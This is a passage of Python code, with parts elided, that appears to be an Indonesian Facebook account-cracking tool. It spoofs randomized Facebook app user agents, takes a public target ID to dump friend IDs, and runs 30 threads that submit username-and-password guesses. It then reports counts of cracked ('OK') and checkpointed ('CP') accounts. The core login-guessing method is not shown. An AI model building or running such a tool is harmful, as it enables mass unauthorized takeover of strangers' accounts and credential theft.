...
for z in range(200):
	...
	ua = f"Mozilla/5.0 (iPhone; U; CPU iPhone OS {versi_iphone} build/{build}; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Chrome/{versi_chrome} Mobile/8L1 Safari/6533.18.5 [FBAN/EMA;FBLC/en_US;FBAV/{str(rr(100,1000))}.0.0.{str(rr(1,50))}.{str(rr(10000,90000))};]"
	if ua in ugent:pass
...
class Menu:
	...
	def menu(self):
		...
		###----------[ PANEL BIASA ]---------- ###
		prints(Panel(f"{U2}{self.ip}",padding=(0,30),title=f"{M2}{nama}",subtitle=f"{M2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""{U2}[{color_text}01{U2}]. crack dari id publiki""",width=80,padding=(0,6),style=f"{color_panel}"))
		prints(Panel(f"""{U2}ketik {M2}bot{U2} untuk ke menu bot dan ketik {M2}lain{U2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
		menu = console.input(f" {U2}• {U2}pilih menu : ")
		
		###----------[ ID PUBLIK ]---------- ###
		if menu in["1","01"]:
			prints(Panel(f"""{U2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{U2}ketik {M2}me{U2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
			...
			with ThreadPoolExecutor(max_workers=30) as fall:
				...
				for data in tampung:
					try:
						...
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{U2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{U2} CP : {M2}{len(self.cp)}{M2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
